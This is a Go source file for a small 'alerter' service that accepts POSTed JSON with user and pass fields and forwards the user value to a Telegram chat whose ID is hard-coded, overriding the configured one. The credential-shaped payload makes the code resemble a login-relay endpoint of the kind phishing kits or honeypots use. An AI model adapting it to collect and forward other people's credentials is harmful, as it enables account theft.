package main

import (
	"encoding/json"
	"net/http"

	"github.com/BurntSushi/toml"
	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api"
	log "github.com/sirupsen/logrus"
	"gopkg.in/alecthomas/kingpin.v2"
)

var conf struct {
	ListenPort string `toml:"listen_port"`
	TgBotToken string `toml:"tg_bot_token"`
	TgChatID   int64  `toml:"tg_chat_id"`
}

var confPath = kingpin.Flag("conf", "Path to config file.").Short('c').Default("alerter.conf.toml").String()
var debug = kingpin.Flag("debug", "Run in debug mode").Short('d').Default("false").Bool()

func main() {
	kingpin.Parse()

	if _, err := toml.DecodeFile(*confPath, &conf); err != nil {
		log.Fatalf("Error decoding config file from %s", *confPath)
	}

	bot, err := tgbotapi.NewBotAPI(conf.TgBotToken)
	if err != nil {
		log.Panic(err)
	}

	if *debug {
		bot.Debug = true
	}

	msg := tgbotapi.NewMessage(conf.TgChatID, "hello there")
	bot.Send(msg)

	log.Printf("Authorized on account %s", bot.Self.UserName)

	alertChan := make(chan Alert, 1000)

	go tgBotHandleAlerts(bot, alertChan)

	processAlerts := makeHandler(alertChan)
	http.HandleFunc("/", processAlerts)
	if err := http.ListenAndServe(conf.ListenPort, nil); err != nil {
		log.Fatal(err)
	}
}

func makeHandler(alertChan chan<- Alert) func(http.ResponseWriter, *http.Request) {
	return func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/" {
			http.Error(w, "404 Not Found", http.StatusNotFound)
			return
		}

		switch r.Method {
		case "POST":
			decoder := json.NewDecoder(r.Body)
			var a Alert
			err := decoder.Decode(&a)
			if err != nil {
				log.Errorf("failed to decode request body: %s", err)
			} else {
				alertChan <- a
				log.Infof("hello from http: %s", a.User)
			}

		default:
			http.Error(w, "405 Method Not Allowed", http.StatusMethodNotAllowed)
		}
	}
}

func tgBotHandleAlerts(bot *tgbotapi.BotAPI, alertChan <-chan Alert) {
	for {
		a := <-alertChan
		log.Infof("hello from telegram: %s", a.User)
		msg := tgbotapi.NewMessage(-1001453885388, a.User)
		_, err := bot.Send(msg)
		if err != nil {
			log.Errorf("failed to send message: %s", err)
		}
	}
}

type Alert struct {
	User string `json:"user"`
	Pass string `json:"pass"`
}
